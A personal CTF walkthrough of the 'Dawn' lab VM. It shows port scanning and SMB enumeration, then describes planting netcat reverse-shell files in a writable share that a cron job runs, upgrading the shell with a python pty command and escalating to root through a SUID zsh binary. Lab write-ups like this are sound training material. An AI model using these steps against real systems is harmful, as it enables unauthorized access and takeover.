<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Dawn</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><div class="main"><div class="tree">
<p><strong>Index</strong></p>
<p><a href="2019.html">2019</a></p>

<ol>
<li><a href="2019--BasicPenTestingBox.html">BasicPenTestingBox</a></li>
<li><a href="2019--BasicPenTestingBox2.html">BasicPenTestingBox2</a></li>
<li><a href="2019--bee_box.html">bee box</a></li>
<li><a href="2019--BossPlayer.html">BossPlayer</a></li>
<li><a href="2019--CyberChallenge19.html">CyberChallenge19</a></li>
<li><a href="2019--Dawn.html">Dawn</a></li>
<li><a href="2019--DC-1.html">DC-1</a></li>
<li><a href="2019--DC-2.html">DC-2</a></li>
<li><a href="2019--DC-3.html">DC-3</a></li>
<li><a href="2019--DerpNStik.html">DerpNStik</a></li>
<li><a href="2019--EVM.html">EVM</a></li>
<li><a href="2019--Fowsniff.html">Fowsniff</a></li>
<li><a href="2019--Gemini_Inc_1.html">Gemini Inc 1</a></li>
<li><a href="2019--JIS_CTF.html">JIS_CTF</a></li>
<li><a href="2019--mullidae.html">mullidae</a></li>
<li><a href="2019--PumpkinFestival.html">PumpkinFestival</a></li>
<li><a href="2019--PumpkinGarden.html">PumpkinGarden</a></li>
<li><a href="2019--PumpkinRaising.html">PumpkinRaising</a></li>
<li><a href="2019--QuaoarCTFHackfest2016.html">QuaoarCTFHackfest2016</a></li>
<li><a href="2019--Rickdiculously_Easy.html">Rickdiculously Easy</a></li>
<li><a href="2019--silky02.html">silky02</a></li>
<li><a href="2019--silky1.html">silky1</a></li>
<li><a href="2019--Typhoon.html">Typhoon</a></li>
<li><a href="2019--VMS_to_try.html">VMS to try</a></li>
<ol>
<li><a href="2019--VMS_to_try--US_Gov_Conf.html">US Gov Conf</a></li>
<li><a href="2019--VMS_to_try--Gruyere.html">Gruyere</a></li>
</ol>
<li><a href="2019--xss_challenges.html">xss challenges</a></li>
<li><a href="2019--Blue.html">Blue</a></li>
<li><a href="2019--mr_robot.html">mr robot</a></li>
<li><a href="2019--Unfinished_VMS.html">Unfinished VMS</a></li>
<ol>
<li><a href="2019--Unfinished_VMS--CasinoRoyale.html">CasinoRoyale</a></li>
<li><a href="2019--Unfinished_VMS--WinterMute_Straylight.html">WinterMute Straylight</a></li>
<li><a href="2019--Unfinished_VMS--connect_the_dots_(unfinished).html">connect the dots (unfinished)</a></li>
<li><a href="2019--Unfinished_VMS--arsenal.html">arsenal</a></li>
<li><a href="2019--Unfinished_VMS--heist.html">heist</a></li>
<li><a href="2019--Unfinished_VMS--MyHouse_Box.html">MyHouse Box</a></li>
<li><a href="2019--Unfinished_VMS--Sputnik.html">Sputnik</a></li>
<li><a href="2019--Unfinished_VMS--Node.html">Node</a></li>
<li><a href="2019--Unfinished_VMS--HackInOs.html">HackInOs</a></li>
<li><a href="2019--Unfinished_VMS--Seattle.html">Seattle</a></li>
<li><a href="2019--Unfinished_VMS--DC416-Galahad.html">DC416-Galahad</a></li>
</ol>
<li><a href="2019--Not_a_Box.html">Not a Box</a></li>
<ol>
<li><a href="2019--Not_a_Box--securitytreasurehunt_web.html">securitytreasurehunt web</a></li>
<li><a href="2019--Not_a_Box--rpc.html">rpc</a></li>
<li><a href="2019--Not_a_Box--msf_fix.html">msf fix</a></li>
</ol>
<li><a href="2019--ICE.html">ICE</a></li>
</ol></div>
<div class="page"><h1><b><u>Dawn</u></b></h1><br />-----------------------------[ netdiscover ]----------------------------------------------------------------- <br /> <br /> Currently scanning: 172.26.113.0/16   |   Screen View: Unique Hosts           <br />                                                                               <br /> 174 Captured ARP Req/Rep packets, from 9 hosts.   Total size: 10440           <br /> _____________________________________________________________________________<br />   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      <br /> -----------------------------------------------------------------------------<br /> 192.168.0.1     18:a6:f7:3a:5d:aa      1      60  TP-LINK TECHNOLOGIES CO.,LTD<br /> 192.168.0.1     10:be:f5:23:7e:c7      1      60  D-Link International        <br /> 192.168.0.1     e4:6f:13:30:07:4c    160    9600  D-Link International        <br /> 192.168.0.1     d4:6e:0e:9f:f2:bd      1      60  TP-LINK TECHNOLOGIES CO.,LTD<br /> 192.168.0.1     ec:ad:e0:d4:ea:c1      1      60  D-Link International        <br /> 192.168.7.1     e4:6f:13:30:07:4c      1      60  D-Link International        <br /> 192.168.7.1     10:be:f5:23:7e:c7      1      60  D-Link International        <br /> 172.19.211.30   08:00:27:7c:6b:f6      6     360  PCS Systemtechnik GmbH      <br /> 172.19.210.1    d0:c2:82:c7:94:40      2     120  Cisco Systems, Inc          <br /><br />-----------------------------------[ IFCONFIG ]---------------------------------------------------------------<br /><br />vmnet1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500<br />        inet 192.168.253.1  netmask 255.255.255.0  broadcast 192.168.253.255<br />        inet6 fe80::250:56ff:fec0:1  prefixlen 64  scopeid 0x20&lt;link&gt;<br />        ether 00:50:56:c0:00:01  txqueuelen 1000  (Ethernet)<br />        RX packets 0  bytes 0 (0.0 B)<br />        RX errors 0  dropped 0  overruns 0  frame 0<br />        TX packets 83  bytes 0 (0.0 B)<br />        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0<br /><br />vmnet8: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500<br />        inet 172.16.124.1  netmask 255.255.255.0  broadcast 172.16.124.255<br />        inet6 fe80::250:56ff:fec0:8  prefixlen 64  scopeid 0x20&lt;link&gt;<br />        ether 00:50:56:c0:00:08  txqueuelen 1000  (Ethernet)<br />        RX packets 0  bytes 0 (0.0 B)<br />        RX errors 0  dropped 0  overruns 0  frame 0<br />        TX packets 83  bytes 0 (0.0 B)<br />        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0<br /><br />---------------------[ PING ]-------------------------------------------------<br /><br />crazyeights@kali:~$ ping 172.19.211.30<br />PING 172.19.211.30 (172.19.211.30) 56(84) bytes of data.<br />64 bytes from 172.19.211.30: icmp_seq=1 ttl=64 time=0.240 ms<br />64 bytes from 172.19.211.30: icmp_seq=2 ttl=64 time=0.109 ms<br />^C<br />--- 172.19.211.30 ping statistics ---<br />2 packets transmitted, 2 received, 0% packet loss, time 1016ms<br />rtt min/avg/max/mdev = 0.109/0.174/0.240/0.065 ms<br /><br />-------------------[  NMAP  ]------------------------------------------------<br /><br />crazyeights@kali:~$ sudo nmap -PS 172.19.211.30<br />[sudo] password for crazyeights: <br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-09-09 13:41 EDT<br />Nmap scan report for ad10-211-30.resnet.carleton.ca (172.19.211.30)<br />Host is up (0.00015s latency).<br />Not shown: 996 closed ports<br />PORT     STATE SERVICE<br />80/tcp   open  http<br />139/tcp  open  netbios-ssn<br />445/tcp  open  microsoft-ds<br />3306/tcp open  mysql<br />MAC Address: 08:00:27:7C:6B:F6 (Oracle VirtualBox virtual NIC)<br /><br />Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds<br />crazyeights@kali:~$ <br /><br /><img src="images/2-1.png" alt="images/2-1.png" /><br /><br />msf5 &gt; search crawler<br /><br />Matching Modules<br />================<br /><br />   #  Name                                     Disclosure Date  Rank    Check  Description<br />   -  ----                                     ---------------  ----    -----  -----------<br />   0  auxiliary/crawler/msfcrawler                              normal  Yes    Metasploit Web Crawler<br />   1  auxiliary/scanner/http/crawler                            normal  No     Web Site Crawler<br />   2  exploit/windows/mssql/mssql_linkcrawler  2000-01-01       great   No     Microsoft SQL Server Database Link Crawling Command Execution<br /><br /><br />msf5 &gt; use auxiliary/crawler/msfcrawler<br />msf5 auxiliary(crawler/msfcrawler) &gt; options<br /><br />Module options (auxiliary/crawler/msfcrawler):<br /><br />   Name     Current Setting  Required  Description<br />   ----     ---------------  --------  -----------<br />   PATH     /                yes       Starting crawling path<br />   RHOSTS                    yes       The target address range or CIDR identifier<br />   RPORT    80               yes       Remote port<br />   THREADS  1                yes       The number of concurrent threads<br /><br />msf5 auxiliary(crawler/msfcrawler) &gt; set RHOSTS<br />[-] Unknown variable<br />Usage: set [option] [value]<br /><br />Set the given option to value.  If value is omitted, print the current value.<br />If both are omitted, print options that are currently set.<br /><br />If run from a module context, this will set the value in the module's<br />datastore.  Use -g to operate on the global datastore<br /><br />msf5 auxiliary(crawler/msfcrawler) &gt; set RHOSTS 172.19.211.30<br />RHOSTS =&gt; 172.19.211.30<br />msf5 auxiliary(crawler/msfcrawler) &gt; exploit<br /><br />[*] Loading modules: /usr/share/metasploit-framework/data/msfcrawler<br />[*] Loaded crawler module Simple from /usr/share/metasploit-framework/data/msfcrawler/basic.rb...<br />[*] Loaded crawler module Comments from /usr/share/metasploit-framework/data/msfcrawler/comments.rb...<br />[*] Loaded crawler module Forms from /usr/share/metasploit-framework/data/msfcrawler/forms.rb...<br />[*] Loaded crawler module Frames from /usr/share/metasploit-framework/data/msfcrawler/frames.rb...<br />[*] Loaded crawler module Image from /usr/share/metasploit-framework/data/msfcrawler/image.rb...<br />[*] Loaded crawler module Link from /usr/share/metasploit-framework/data/msfcrawler/link.rb...<br />[*] Loaded crawler module Objects from /usr/share/metasploit-framework/data/msfcrawler/objects.rb...<br />[*] Loaded crawler module Scripts from /usr/share/metasploit-framework/data/msfcrawler/scripts.rb...<br />[*] OK<br />[*] URI LIMITS ENABLED: 10 (Maximum number of requests per uri)<br />[*] Target: 172.19.211.30 Port: 80 Path: / SSL: <br />[*] &gt;&gt; [200] /<br /><br /><br />---------------------------------------------------[ SKIPFISH ]----------------------------------------------------<br /><br />crazyeights@kali:~$ skipfish -o dawn_spider_iv -S /usr/share/skipfish/dictionaries/minimal.wl <a href="http://172.19.211.30:80">http://172.19.211.30:80</a><br /><br /><img src="images/2-2.png" alt="images/2-2.png" /><br /><br /><br /><img src="images/2-3.png" alt="images/2-3.png" /><br /><br /><br />managment,logs in server-status:<br /><br />2019/09/09 13:40:02 [31;1mCMD: UID=0    PID=985    | /bin/sh -c /home/ganimedes/phobos [0m <br />---&gt; There is a user gainmedes<br />2019/09/09 13:41:01 [31;1mCMD: UID=1000 PID=1000   | /bin/sh -c /home/dawn/ITDEPT/product-control <br />--&gt; There is a user dawn<br /><br />3306/tcp open  mysql<br /><br />razyeights@kali:~$ enum4linux 172.19.211.30<br />Starting enum4linux v0.8.9 ( <a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a> ) on Mon Sep  9 14:45:46 2019<br /><br /> ========================== <br />|    Target Information    |<br /> ========================== <br />Target ........... 172.19.211.30<br />RID Range ........ 500-550,1000-1050<br />Username ......... ''<br />Password ......... ''<br />Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none<br /><br /><br /> ===================================================== <br />|    Enumerating Workgroup/Domain on 172.19.211.30    |<br /> ===================================================== <br />[+] Got domain/workgroup name: WORKGROUP<br /><br /> ============================================= <br />|    Nbtstat Information for 172.19.211.30    |<br /> ============================================= <br />Looking up status of 172.19.211.30<br />	DAWN            &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service<br />	DAWN            &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service<br />	DAWN            &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service<br />	..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser<br />	WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name<br />	WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser<br />	WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections<br /><br />	MAC Address = 00-00-00-00-00-00<br /><br /> ====================================== <br />|    Session Check on 172.19.211.30    |<br /> ====================================== <br />[+] Server 172.19.211.30 allows sessions using username '', password ''<br /><br /> ============================================ <br />|    Getting domain SID for 172.19.211.30    |<br /> ============================================ <br />mkdir failed on directory /var/run/samba/msg.lock: Permission denied<br />Unable to initialize messaging context<br />mkdir failed on directory /var/run/samba/msg.lock: Permission denied<br />Domain Name: WORKGROUP<br />Domain Sid: (NULL SID)<br />[+] Can't determine if host is part of domain or part of a workgroup<br /><br /> ======================================= <br />|    OS information on 172.19.211.30    |<br /> ======================================= <br />Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.<br />[+] Got OS info for 172.19.211.30 from smbclient: <br />[+] Got OS info for 172.19.211.30 from srvinfo:<br />mkdir failed on directory /var/run/samba/msg.lock: Permission denied<br />Unable to initialize messaging context<br />mkdir failed on directory /var/run/samba/msg.lock: Permission denied<br />	DAWN           Wk Sv PrQ Unx NT SNT Samba 4.9.5-Debian<br />	platform_id     :	500<br />	os version      :	6.1<br />	server type     :	0x809a03<br /><br /> ============================== <br />|    Users on 172.19.211.30    |<br /> ============================== <br />Use of uninitialized value $users in print at ./enum4linux.pl line 874.<br />Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.<br /><br />Use of uninitialized value $users in print at ./enum4linux.pl line 888.<br />Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.<br /><br /> ========================================== <br />|    Share Enumeration on 172.19.211.30    |<br /> ========================================== <br />mkdir failed on directory /var/run/samba/msg.lock: Permission denied<br />Unable to initialize messaging context<br /><br />	Sharename       Type      Comment<br />	---------       ----      -------<br />	print$          Disk      Printer Drivers<br />	ITDEPT          Disk      PLEASE DO NOT REMOVE THIS SHARE. IN CASE YOU ARE NOT AUTHORIZED TO USE THIS SYSTEM LEAVE IMMEADIATELY.<br />	IPC$            IPC       IPC Service (Samba 4.9.5-Debian)<br />Reconnecting with SMB1 for workgroup listing.<br /><br />	Server               Comment<br />	---------            -------<br /><br />	Workgroup            Master<br />	---------            -------<br />	WORKGROUP            DAWN<br /><br />[+] Attempting to map shares on 172.19.211.30<br />//172.19.211.30/print$	Mapping: DENIED, Listing: N/A<br /><span style="background-color:#ffff00;">/</span><span style="color:#000000;background-color:#ffff00;">/172.19.211.30/ITDEPT	Mapping: OK, Listing: OK</span><br />//172.19.211.30/IPC$	[E] Can't understand response:<br />mkdir failed on directory /var/run/samba/msg.lock: Permission denied<br />Unable to initialize messaging context<br />NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*<br /><br /> ===================================================== <br />|    Password Policy Information for 172.19.211.30    |<br /> ===================================================== <br /><br /><br />[+] Attaching to 172.19.211.30 using a NULL share<br /><br />[+] Trying protocol 445/SMB...<br /><br />[+] Found domain(s):<br /><br />	[+] DAWN<br />	[+] Builtin<br /><br />[+] Password Info for Domain: DAWN<br /><br />	[+] Minimum password length: 5<br />	[+] Password history length: None<br />	[+] Maximum password age: 37 days 6 hours 21 minutes <br />	[+] Password Complexity Flags: 000000<br /><br />		[+] Domain Refuse Password Change: 0<br />		[+] Domain Password Store Cleartext: 0<br />		[+] Domain Password Lockout Admins: 0<br />		[+] Domain Password No Clear Change: 0<br />		[+] Domain Password No Anon Change: 0<br />		[+] Domain Password Complex: 0<br /><br />	[+] Minimum password age: None<br />	[+] Reset Account Lockout Counter: 30 minutes <br />	[+] Locked Account Duration: 30 minutes <br />	[+] Account Lockout Threshold: None<br />	[+] Forced Log off Time: 37 days 6 hours 21 minutes <br /><br /><br />[+] Retieved partial password policy with rpcclient:<br /><br />Password Complexity: Disabled<br />Minimum Password Length: 5<br /><br /><br /> =============================== <br />|    Groups on 172.19.211.30    |<br /> =============================== <br /><br />[+] Getting builtin groups:<br /><br />[+] Getting builtin group memberships:<br /><br />[+] Getting local groups:<br /><br />[+] Getting local group memberships:<br /><br />[+] Getting domain groups:<br /><br />[+] Getting domain group memberships:<br /><br /> ======================================================================== <br />|    Users on 172.19.211.30 via RID cycling (RIDS: 500-550,1000-1050)    |<br /> ======================================================================== <br />[I] Found new SID: S-1-22-1<br />[I] Found new SID: S-1-5-21-4292367078-475864837-953252120<br />[I] Found new SID: S-1-5-32<br />[+] Enumerating users using SID S-1-5-21-4292367078-475864837-953252120 and logon username '', password ''<br />S-1-5-21-4292367078-475864837-953252120-500 *unknown*\*unknown* (8)<br />S-1-5-21-4292367078-475864837-953252120-501 DAWN\nobody (Local User)<br /><br />crazyeights@kali:~$ smbclient \\\\172.19.211.30\\ITDEPT -N<br />mkdir failed on directory /var/run/samba/msg.lock: Permission denied<br />Unable to initialize messaging context<br />Try "help" to get a list of possible commands.<br />smb: \&gt; ls<br />  .                                   D        0  Fri Aug  2 23:23:20 2019<br />  ..                                  D        0  Fri Aug  2 23:21:39 2019<br /><br />the managment log seemed to be updating itself every minute.<br /><br />reate our own versions of the web-control and product-control files on the system and maybe we can get them to run when the managment log triggers .<br /><br />. We can just use a simple nc shell for the contents of the files.<br /><br /><br /><br /><br />2<img src="images/2-4.png" alt="images/2-4.png" /> payloads each set up to call back on a different port so we can see which file gets called if any of them.<br />We just need to set up a nc listener for each of the payloads, then back on the SMB share we can use the PUT command to upload the files.<br /><br /><br />wa<img src="images/2-5.png" alt="images/2-5.png" />it a minute and see if our payloads are triggered.<br />We got a hit from the product-control payload and we’ve landed in a reverse-shell for the user dawn<br /><br /><br />u<img src="images/2-6.png" alt="images/2-6.png" />pgrade the shell using our standard python cmd<br />python -c “import pty;pty.spawn(‘/bin/bash’)”<br />We can now cd to the /tmp dir and upload our LinEnum.sh script to help us priv esc to root on the box<br />Looking through the output we can see that the zsh shell seems to have SUID set on it.<br />-rwsr-xr-x 1 root root 861568 Feb 4 2019 /usr/bin/zsh<br />and as this is an easy box lets just try and open a zsh shell and see if we land as root.<br />And we are in!!!<br />www-data@dawn:/tmp$ /usr/bin/zsh <br />/usr/bin/zsh<br />dawn# whoami <br />whoami<br />root<br /><br /><img src="images/2-7.png" alt="images/2-7.png" /></div></div>
</body></html>